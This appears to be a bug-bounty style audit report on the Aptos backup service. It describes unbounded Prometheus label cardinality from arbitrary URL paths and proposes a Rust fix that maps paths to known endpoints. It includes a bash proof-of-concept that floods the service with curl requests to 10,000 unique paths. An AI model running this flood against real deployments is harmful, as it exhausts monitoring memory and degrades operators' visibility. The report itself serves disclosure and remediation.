Based on my thorough analysis of the backup service metrics implementation, I've identified a valid security issue related to unbounded metric label cardinality.

# Audit Report

## Title
Unbounded Metric Label Cardinality Enables Memory Exhaustion in Backup Service

## Summary
The backup service's `LATENCY_HISTOGRAM` metric extracts the endpoint label directly from arbitrary URL paths without validation or bounding, allowing attackers to create unlimited unique metric time series by sending GET requests to non-existent endpoints. This causes memory exhaustion in the Prometheus metrics system.

## Finding Description

The backup service implements request latency tracking using a Prometheus histogram with two labels: `endpoint` and `status`. [1](#0-0) 

The metric is populated within a Warp logging middleware that executes for all HTTP responses: [2](#0-1) 

The critical vulnerability lies in how the `endpoint` label is extracted: it directly uses the second path segment from the URL via `info.path().split('/').nth(1).unwrap_or("-")` without any validation or mapping to a bounded set of values.

The service routes are properly defined with specific paths (9 endpoints total): [3](#0-2) 

However, the logging middleware is applied via `.with()` to the top-level filter WITHOUT a preceding `.recover()` call: [4](#0-3) 

When a request doesn't match any defined route, Warp's default rejection handler converts it to a 404 response, and the `.with()` middleware still executes, logging the arbitrary endpoint name. The test suite confirms this behavior: [5](#0-4) 

**Attack Flow:**
1. Attacker sends: `GET /malicious_endpoint_1/foo` → Returns 404
2. Middleware extracts `endpoint="malicious_endpoint_1"`, `status="404"`
3. Creates time series: `aptos_backup_service_latency_s{endpoint="malicious_endpoint_1", status="404"}`
4. Repeat with unique endpoints: `malicious_endpoint_2`, `malicious_endpoint_3`, ..., `malicious_endpoint_N`
5. Each unique endpoint creates a new time series in Prometheus
6. With sufficient requests, this exhausts Prometheus memory, degrading or crashing the monitoring system

## Impact Explanation

This is a **Low severity** issue per the Aptos bug bounty program criteria. While it enables resource exhaustion, the impact is limited to the monitoring/observability layer rather than the blockchain core:

- **Does NOT affect**: Consensus safety, state integrity, transaction execution, or fund security
- **DOES affect**: Operational monitoring visibility and Prometheus system stability
- **Scope**: Monitoring infrastructure, not blockchain operation

The backup service is typically not publicly exposed, limiting the attack surface to internal network actors or authenticated clients. However, compromised internal services or malicious insiders could exploit this.

## Likelihood Explanation

**Likelihood: Medium to High** if the backup service is network-accessible

- **Attack complexity**: Low - simple HTTP GET requests with arbitrary paths
- **Attacker requirements**: Network access to backup service endpoint (typically port-restricted)
- **Detection**: May go unnoticed until Prometheus exhibits memory pressure or crashes
- **Persistence**: Metrics persist in Prometheus memory until scraped and potentially in long-term storage

The attack is trivial to execute programmatically (e.g., a simple bash loop sending requests to unique endpoints).

## Recommendation

Implement proper label bounding by mapping extracted endpoint values to a fixed set. The endpoint should only be one of the defined routes, with all unknown paths mapped to a catchall value:

```rust
pub(super) static LATENCY_HISTOGRAM: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_backup_service_latency_s",
        "Backup service endpoint latency.",
        &["endpoint", "status"]
    )
    .unwrap()
});

fn normalize_endpoint(path: &str) -> &str {
    // Extract second path segment
    let segment = path.split('/').nth(1).unwrap_or("-");
    
    // Map to known endpoints only
    match segment {
        "db_state" => "db_state",
        "state_range_proof" => "state_range_proof",
        "state_snapshot" => "state_snapshot",
        "state_item_count" => "state_item_count",
        "state_snapshot_chunk" => "state_snapshot_chunk",
        "state_root_proof" => "state_root_proof",
        "epoch_ending_ledger_infos" => "epoch_ending_ledger_infos",
        "transactions" => "transactions",
        "transaction_range_proof" => "transaction_range_proof",
        _ => "unknown", // Catchall for non-matching paths
    }
}

// In get_routes():
.with(warp::log::custom(|info| {
    let endpoint = normalize_endpoint(info.path());
    LATENCY_HISTOGRAM.observe_with(
        &[endpoint, info.status().as_str()],
        info.elapsed().as_secs_f64(),
    )
}))
```

This bounds the cardinality to: 10 endpoints (9 known + 1 "unknown") × ~100 HTTP status codes = ~1,000 unique time series maximum.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Generate high-cardinality metrics by hitting arbitrary endpoints

BACKUP_SERVICE_URL="http://localhost:6186"  # Default backup service port

# Send requests to 10,000 unique non-existent endpoints
for i in {1..10000}; do
    curl -s "${BACKUP_SERVICE_URL}/attack_endpoint_${i}/dummy" > /dev/null &
    
    # Batch requests to avoid overwhelming the shell
    if [ $((i % 100)) -eq 0 ]; then
        wait
        echo "Sent $i requests..."
    fi
done

wait
echo "Attack complete. Check Prometheus metrics cardinality for aptos_backup_service_latency_s"
echo "Expected result: ~10,000+ unique time series created, causing memory pressure"
```

After running this script, query Prometheus:
```promql
count(aptos_backup_service_latency_s)
```

This will show thousands of unique time series, far exceeding the expected 9-10 for legitimate endpoints.

## Notes

While this is classified as Low severity because it affects monitoring rather than blockchain operation, it still represents a security weakness. High-cardinality metrics are a well-known anti-pattern in Prometheus deployments and can lead to:

1. Increased memory consumption in Prometheus
2. Slower query performance
3. Potential crashes of monitoring infrastructure
4. Loss of operational visibility when most needed

The fix is straightforward and aligns with Prometheus best practices: always bound label values to a known, finite set.

### Citations

**File:** storage/backup/backup-service/src/handlers/utils.rs (L17-24)
```rust
pub(super) static LATENCY_HISTOGRAM: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_backup_service_latency_s",
        "Backup service endpoint latency.",
        &["endpoint", "status"]
    )
    .unwrap()
});
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L17-25)
```rust
static DB_STATE: &str = "db_state";
static STATE_RANGE_PROOF: &str = "state_range_proof";
static STATE_SNAPSHOT: &str = "state_snapshot";
static STATE_ITEM_COUNT: &str = "state_item_count";
static STATE_SNAPSHOT_CHUNK: &str = "state_snapshot_chunk";
static STATE_ROOT_PROOF: &str = "state_root_proof";
static EPOCH_ENDING_LEDGER_INFOS: &str = "epoch_ending_ledger_infos";
static TRANSACTIONS: &str = "transactions";
static TRANSACTION_RANGE_PROOF: &str = "transaction_range_proof";
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L137-146)
```rust
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
```

**File:** storage/backup/backup-service/src/lib.rs (L53-57)
```rust
        // Endpoint doesn't exist.
        let resp = get(format!("http://127.0.0.1:{}/", port)).unwrap();
        assert_eq!(resp.status(), 404);
        let resp = get(format!("http://127.0.0.1:{}/x", port)).unwrap();
        assert_eq!(resp.status(), 404);
```
